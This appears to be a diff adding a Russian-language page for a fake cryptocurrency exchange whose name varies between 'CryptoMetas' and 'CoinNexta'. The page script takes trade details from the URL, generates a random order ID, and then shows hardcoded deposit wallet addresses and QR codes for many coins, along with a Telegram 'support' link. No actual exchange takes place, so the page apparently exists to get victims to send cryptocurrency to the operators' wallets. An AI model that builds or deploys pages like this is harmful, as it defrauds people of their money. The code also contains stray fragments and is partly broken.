@@ -1,0 +1,456 @@
+﻿    <!DOCTYPE html>
+    <html lang="en">
+
+    <head>
+        <script>
+            const minUSD = 187 ; 
+            const maxUSD = 90136 ; 
+            const tg_link = "https://t.me/Sup_nextas";  
+            var percent = 9;  
+        </script>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <link rel="shortcut icon" href="img/burger(Copy).jpg" type="image/png">
+        <title>CryptoMetas - cryptocurrency exchange</title>
+
+        <meta name="title" content="CoinNexta - cryptocurrency exchange">
+        <meta name="description" content="The leading cryptocurrency exchange platform offers different trading options, provides 24/7 customer support, high level of security.">
+        <link href="css/bootstrap.min.css" rel="stylesheet">
+        <link href="css/bootstrap-reboot.min.css" rel="stylesheet">
+        <link href="css/animate.min.css" rel="stylesheet">
+        <link href="css/fonts.css" rel="stylesheet">
+        <link href="css/style.min.css" rel="stylesheet">
+        <link href="css/main.css" rel="stylesheet">
+        <script>
+            const AJAX_URL = '/ajax';
+        </script>
+    
+        
+         <script>
+            let bonus = 2.5 + 100;
+        </script>
+    </head>
+
+    <body style="overflow: auto;">
+        <div class="wrapper">
+
+            <div class="preloader" style="display: none;">
+                <div class="preloader__circle"></div>
+            </div>
+
+            <header class="header wow animate__fadeInDown" style="visibility: visible; animation-name: fadeInDown;">
+                <div class="container header__container">
+                    <div class="header__body">
+                        <a class="header__logo header__logo-hide" href="../">
+                            <img src="../fonts/LOGOex.svg" alt="logo">
+                        </a>
+
+                        <div class="header__hide">
+                            <a class="header__logo" href="../">
+                                <img src="../fonts/LOGOex.svg" alt="logo">
+                            </a>
+                            <nav class="header__nav">
+                                <ul class="header__list">
+                                    <li class="header__item">
+                                        <a class="header__link" href="../#about">О нас</a>
+                                    </li>
+                                    <li class="header__item">
+                                        <a class="header__link" href="../#exchange">Обмен</a>
+                                    </li>
+                                    <li class="header__item">
+                                        <a class="header__link" href="../#how-exchange">Как обменять</a>
+                                    </li>
+                                    <li class="header__item">
+                                        <a class="header__link" href="../#transactions">Транзакции</a>
+                                    </li>
+                                    <li class="header__item">
+                                        <a class="header__link" href="../#support">Поддержка</a>
+                                    </li>
+                                </ul>
+                            </nav>
+
+                            <div class="header__wrapper">
+                                <!-- <div class="header__lang">
+                        <div class="header__lang-lang">
+                            <a class="header__lang-wrapper" href="">
+                                <img src="/images/ua.svg" alt="ua">
+                                <div class="header__lang-text">
+                                    Eng
+                                </div>
+                            </a>
+                            <a class="header__lang-wrapper header__lang-dropdown"
+                                href="#">
+                                <img src="/images/ru.svg" alt="ru">
+                                <div class="header__lang-text">
+                                    Ru
+                                </div>
+                            </a>
+                        </div>
+                        <img class="header__lang-arrow" src="/images/arrow.svg" alt="arrow">
+                    </div> -->
+                                <a class="header__btn" href="../#exchange">
+                                    Обмен
+                    </a>
+                            </div>
+                        </div>
+                        <div class="header__burger">
+                            <span></span>
+                            <span></span>
+                            <span></span>
+                        </div>
+                    </div>
+                    <div class="header__burger-content">
+                        <nav class="header__nav">
+                            <ul class="header__list">
+                                <li class="header__item">
+                                    <a class="header__link" href="../#about">О нас</a>
+                                </li>
+                                <li class="header__item">
+                                    <a class="header__link" href="../#exchange">Обмен</a>
+                                </li>
+                                <li class="header__item">
+                                    <a class="header__link" href="../#how-exchange">Как обменять</a>
+                                </li>
+                                <li class="header__item">
+                                    <a class="header__link" href="../#transactions">Транзакции</a>
+                                </li>
+                                <li class="header__item">
+                                    <a class="header__link" href="../#support">Поддержка</a>
+                                </li>
+                            </ul>
+                        </nav>
+                        <div class="header__wrapper">
+                            <!-- <div class="header__lang">
+                    <div class="header__lang-lang">
+                        <a class="header__lang-wrapper" href="">
+                            <img src="/images/ua.svg" alt="ua">
+                            <div class="header__lang-text">
+                                Eng
+                            </div>
+                        </a>
+                        <a class="header__lang-wrapper header__lang-dropdown" href="#">
+                            <img src="/images/ru.svg" alt="ru">
+                            <div class="header__lang-text">
+                                Ru
+                            </div>
+                        </a>
+                    </div>
+                    <img class="header__lang-arrow" src="/images/arrow.svg" alt="arrow">
+                </div> -->
+                            <a class="header__btn" href="../#exchange">
+                    Обмен
+                </a>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+            <main class="main">
+
+                <section class="transaction">
+                    <div class="container transaction__container wow animate__fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
+                        <h1 class="transaction__title" id="transaction__title_val"> </h1>
+
+                        <div class="transaction__order">
+                                                    </div>
+
+                        <div class="transaction-1">
+                            <div clafss="transaction__block">
+                                <div class="transaction__block-title">
+                                    Предварительный просмотр   
+                                </div>
+
+                                <div class="transaction__block-wrapper">
+                                    <div class="transaction__block-text">
+                                        
+                                    </div>
+                                    <div class="transaction__block-text2">
+
+                                    </div>
+                                </div>
+
+                                <div class="transaction__block-input-wrapper">
+                                    <div class="transaction__block-input-img">
+                                        <img src="img/coin2.svg" alt="coin">
+                                    </div>
+                                    <input class="transaction__block-input" id="transaction__block_val" type="text" value="" data-value="" readonly="">
+                                    <div class="transaction__block-input-copy transaction__block-input-copy-val">
+                                        Копировать
+                                    </div>
+                                </div>
+                                <div class="transaction__block-input-wrapper">
+                                    <div class="transaction__block-input-img">
+                                        <img src="img/wallet2.svg" alt="wallet">
+                                    </div>
+
+                                    <input class="transaction__block-input" id="transaction__block_val2" type="text" value="" data-value="" readonly="">
+
+                                    <div class="transaction__block-input-copy transaction__block-input-copy-wallet">
+                                        Копировать
+                                    </div>
+                                </div>
+
+                                <a class="transaction__block-btn" id="confirm_order" href="confirm/index.htm">Подтвердить</a>
+                            </div>
+
+                            <div class="transaction__block">
+                                <div class="transaction__block-title3">
+                                    
+                                </div>
+
+                                <div class="transaction__block-qr">
+                                    <img id="myImage" alt="QR code">
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="transaction__btns">
+                            <a class="transaction__btn" href="../">
+                                <img src="img/home2.svg" alt="home"> Вернуться
+                            </a>
+                        </div>
+                    </div>
+                </section>
+            </main>
+
+            <footer class="footer">
+                <div class="container footer__container">
+                    <div class="footer__start">
+                        <img class="footer__logo" src="img/Logo small white copy.svg" alt="logo">
+                        <div class="footer__text">
+                            ALL RIGHTS RESERVED © 2022 </div>
+                    </div>
+                    <div class="footer__end">
+                        <a class="footer__link" href="https://t.me/">
+                            <img src="img/tg(1).svg" alt="tg">
+                        </a>
+                    </div>
+                </div>
+            </footer>
+
+        </div>
+        <script src="js/jquery.js"></script>
+        <script src="js/confirm_order.js"></script>
+        <script>
+            document.querySelector('.footer__link').setAttribute("href", tg_link)
+        </script>
+        <script>
+            var check = document.querySelector("#transaction__title_val").textContent;
+
+            if (check === "") {
+                window.location.href = '../';
+            }
+        </script>
+        <script src="js/yii.js"></script>
+        <script src="js/wow.min.js"></script>
+        <script src="js/transaction.js"></script><!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+    console.log("START")
+    function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, '\\$&');
+            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        // Использование полученных данных
+        var promo = getParameterByName('promo');
+        var receive = getParameterByName('receive');
+        var send = getParameterByName('send');
+        var crSend = getParameterByName('crSend');
+        var crReceive = getParameterByName('crReceive');
+        var email = getParameterByName('email');
+        var receive_address = getParameterByName('receive_address');
+
+         
+        console.log('promo:', promo);
+        console.log('receive:', receive);
+        console.log('send:', send);
+        console.log('crSend:', crSend);
+        console.log('crReceive:', crReceive);
+        console.log('email:', email);
+        console.log('receive_address:', receive_address);
+
+        function randomInteger(min, max) {
+            let rand = min + Math.random() * (max - min);
+            return Math.round(rand);
+        }
+        
+        $('.transaction__block-text').text('Отправьте: ' + send + ' ' + crSend.split(' ')[1]);
+        $('.transaction__block-title3').text('ID ордера: '+ randomInteger(100000,200000));
+        $('.transaction__block-text2').text('Получите: ' + receive + ' ' + crReceive.split(' ')[1]);
+        $('.transaction__title').text('Обменять\n' +  crSend + ' на ' + crReceive);
+        var element = document.getElementById("transaction__block_val");
+        var element2 = document.getElementById("transaction__block_val2");
+
+        element.dataset.value = send
+        element.value = send + ' ' + crSend.split(' ')[1]
+
+        element2.dataset.value = '0xF0245F6251Bef9447A08766b9DA2B07b28aD80B0'
+        element2.value = '0xF0245F6251Bef9447A08766b9DA2B07b28aD80B0'
+
+        $('.send-class').text('Отправить: ' + send);
+        $('.crSend-class').text('Отправить как: ' + crSend);
+        $('.crReceive-class').text('Получить как: ' + crReceive);
+        $('.email-class').text('Email: ' + email);
+        $('.receive-address-class').text('Адрес получателя: ' + receive_address);
+
+
+        if(crSend.split(' ')[1] == "(BTC)"){
+            element2.dataset.value = 'bc1qa5jdp5jfxe76uwp66xeu88yc4xwyccjxl353r7'
+            element2.value = 'bc1qa5jdp5jfxe76uwp66xeu88yc4xwyccjxl353r7'
+        }
+        else if(crSend.split(' ')[1] == "(ETH)"){
+            element2.dataset.value = '0x644c56dBfFf544d2E6A6bBc3f3a0acEeD3081dc2'
+            element2.value = '0x644c56dBfFf544d2E6A6bBc3f3a0acEeD3081dc2'
+        }
+        else if(crSend.split(' ')[1] == "(MATIC)"){
+            element2.dataset.value = '0x644c56dBfFf544d2E6A6bBc3f3a0acEeD3081dc2'
+            element2.value = '0x644c56dBfFf544d2E6A6bBc3f3a0acEeD3081dc2'
+        }
+        else if(crSend.split(' ')[1] == "(TRX)"){
+            element2.dataset.value = 'TAye9TVdJYn1U7e6fgiSaXh9Lp5ZKdmMyc'
+            element2.value = 'TAye9TVdJYn1U7e6fgiSaXh9Lp5ZKdmMyc'
+        }
+        else if(crSend.split(' ')[1] == "(SOL)"){
+            element2.dataset.value = '8mgcEo1C8u7ULCEsdXWnzJfTHPGt7HS8JGeHhsWiMLT6'
+            element2.value = '8mgcEo1C8u7ULCEsdXWnzJfTHPGt7HS8JGeHhsWiMLT6'
+        }
+        else if(crSend.split(' ')[1] == "(BNB)"){
+            element2.dataset.value = 'bnb18qwhkc39rappkq28nnxfv64hn8cu707kewhfy8'
+            element2.value = 'bnb18qwhkc39rappkq28nnxfv64hn8cu707kewhfy8'
+        }
+
+        else if(crSend.split(' ')[1] == "(FTM)"){
+            element2.dataset.value = '0x644c56dBfFf544d2E6A6bBc3f3a0acEeD3081dc2'
+            element2.value = '0x644c56dBfFf544d2E6A6bBc3f3a0acEeD3081dc2'
+        }
+        else if(crSend.split(' ')[1] == "(XRP)"){
+            element2.dataset.value = 'rnKaQ6xiFM6ku6dFTKEKyqFrJwBHy6jhVj'
+            element2.value = 'rnKaQ6xiFM6ku6dFTKEKyqFrJwBHy6jhVj'
+        }
+        else if(crSend.split(' ')[1] == "(XMR)"){
+            element2.dataset.value = 'None'
+            element2.value = 'None'
+        }
+        else if(crSend.split(' ')[1] == "(DASH)"){
+            element2.dataset.value = 'Xo6geMqhPfmpFAfsBo1xQjdPR2CT2wkZg9'
+            element2.value = 'Xo6geMqhPfmpFAfsBo1xQjdPR2CT2wkZg9'
+        }
+        else if(crSend.split(' ')[1] == "(LTC)"){
+            element2.dataset.value = 'ltc1qvud0f5w2snkzyqjn08p2sjq5tctd6e6w7ntewq'
+            element2.value = 'ltc1qvud0f5w2snkzyqjn08p2sjq5tctd6e6w7ntewq'
+        }
+        else if(crSend.split(' ')[1] == "(USDT)"){
+            element2.dataset.value = 'TAye9TVdJYn1U7e6fgiSaXh9Lp5ZKdmMyc'
+            element2.value = 'TAye9TVdJYn1U7e6fgiSaXh9Lp5ZKdmMyc'
+        }
+        else if(crSend.split(' ')[1] == "(VET)"){
+            element2.dataset.value = '0x40ab581D0453f16Bc5aC84561501c2822215F3Fd'
+            element2.value = '0x40ab581D0453f16Bc5aC84561501c2822215F3Fd'
+        }
+        else if(crSend.split(' ')[1] == "(XLM)"){
+            element2.dataset.value = 'GAVJAYAVRSXVKCZXSX4Q6UTWPK2CAP7DL24AS47C3VHWFMVBMRV2NPX3'
+            element2.value = 'GAVJAYAVRSXVKCZXSX4Q6UTWPK2CAP7DL24AS47C3VHWFMVBMRV2NPX3'
+        }
+        else if(crSend.split(' ')[1] == "(NANO)"){
+            element2.dataset.value = 'nano_1iyzzq6z57n1orgjm4kgqhuqdeskxifbnceeiqwhfe8umdifp77rgg7mossw'
+            element2.value = 'nano_1iyzzq6z57n1orgjm4kgqhuqdeskxifbnceeiqwhfe8umdifp77rgg7mossw'
+        }
+        else if(crSend.split(' ')[1] == "(DOGE)"){
+            element2.dataset.value = 'DK8CoCeMC38HrSPdzS7jDu6VxAPPrH3a5t'
+            element2.value = 'DK8CoCeMC38HrSPdzS7jDu6VxAPPrH3a5t'
+        }
+        else if(crSend.split(' ')[1] == "(ADA)"){
+            element2.dataset.value = 'addr1qx7gz5f6hmmmthla56mjpp5ruet7r32j25xlx09v8chcdy9mg23acnstf6vdpgaaza4n0lpdhth9h0ed8ygkvfv35h0s9chmyg'
+            element2.value = 'addr1qx7gz5f6hmmmthla56mjpp5ruet7r32j25xlx09v8chcdy9mg23acnstf6vdpgaaza4n0lpdhth9h0ed8ygkvfv35h0s9chmyg'
+        }
+        else if(crSend.split(' ')[1] == "(SHIB)"){
+            element2.dataset.value = '0x644c56dBfFf544d2E6A6bBc3f3a0acEeD3081dc2'
+            element2.value = '0x644c56dBfFf544d2E6A6bBc3f3a0acEeD3081dc2'
+        }
+
+        var imageElement = document.getElementById("myImage");
+        
+        if(crSend.split(' ')[1] == "(BTC)"){
+           imageElement.src = "img/BTC.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(ETH)"){
+            imageElement.src = "img/ETH.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(MATIC)"){
+            imageElement.src = "img/MATIC.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(TRX)"){
+            imageElement.src = "img/TRX.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(SOL)"){
+            imageElement.src = "img/Sol.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(BNB)"){
+            imageElement.src = "img/BNB.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(FTM)"){
+            imageElement.src = "img/ETH.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(XRP)"){
+            imageElement.src = "img/XRP.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(XMR)"){
+            element2.dataset.value = 'None'
+            element2.value = 'None'
+        }
+        else if(crSend.split(' ')[1] == "(DASH)"){
+            imageElement.src = "img/Dash.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(LTC)"){
+            imageElement.src = "img/Ltc.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(USDT)"){
+            imageElement.src = "img/Usdt.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(VET)"){
+            imageElement.src = "img/Vet.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(XLM)"){
+            imageElement.src = "img/Xlm.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(NANO)"){
+            imageElement.src = "img/Nano.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(DOGE)"){
+            imageElement.src = "img/Doge.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(ADA)"){
+            imageElement.src = "img/Ada.jpg"
+        }
+        else if(crSend.split(' ')[1] == "(SHIB)"){
+            imageElement.src = "img/Shib.jpg"
+        }
+        
+
+
+  
+
+        querySelector.s
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = 'e83800a025775978b1ae021ded7765558bb5329c';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+
+</script>
+
+
+</script>
+<noscript> Powered by <a href="“https://www.smartsupp.com”" target="“_blank”">Smartsupp</a></noscript>
+    </body>
+
+    </html>
